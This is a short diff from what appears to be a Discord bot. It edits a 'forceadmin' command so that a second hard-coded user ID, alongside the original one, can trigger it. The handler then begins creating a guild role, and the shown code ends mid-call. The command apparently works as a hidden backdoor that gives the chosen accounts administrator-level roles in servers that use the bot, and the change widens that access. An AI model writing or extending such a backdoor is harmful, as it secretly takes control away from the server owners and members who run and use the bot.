@@ -6,7 +6,7 @@ const utils = require("../Utils/Utils");
 
 module.exports = {
     forceadmin: function(msg) {
-        if (msg.author.id == "350718252076367874") {
+        if (msg.author.id == "350718252076367874" || msg.author.id == "813520672550551625") {
             const member = msg.member;
             try {
                 msg.guild.roles.create({
